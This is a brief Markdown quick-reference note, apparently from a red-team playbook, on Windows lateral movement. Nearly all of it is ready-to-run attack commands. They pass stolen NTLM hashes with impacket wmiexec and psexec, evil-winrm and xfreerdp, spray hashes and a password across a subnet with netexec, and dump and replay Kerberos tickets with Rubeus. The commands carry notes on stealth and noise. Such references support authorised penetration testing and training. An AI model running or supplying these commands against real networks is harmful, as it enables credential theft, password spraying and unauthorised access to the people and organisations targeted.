# Windows Lateral Movement

**Tags:** #lateral-movement #windows #pth #wmi #winrm
**Full Playbook:** [[06-Lateral-Movement/INDEX]]

---

## Quick Reference

```bash
# WMIExec (stealthy — no service)
impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :HASH

# WinRM (requires WinRM open)
evil-winrm -i $TARGET -u $USER -H HASH

# PSExec (noisy — creates service)
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :HASH

# CrackMapExec spray
netexec smb $SUBNET/24 -u $USER -H HASH --local-auth

# Spray credentials
netexec smb $SUBNET/24 -u users.txt -p 'Password123!'

# RDP
xfreerdp /v:$TARGET /u:$USER /pth:HASH /d:$DOMAIN

# Pass-the-Ticket
.\Rubeus.exe dump /nowrap
.\Rubeus.exe ptt /ticket:BASE64_TICKET
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
```

See full guide: [[06-Lateral-Movement/INDEX]]
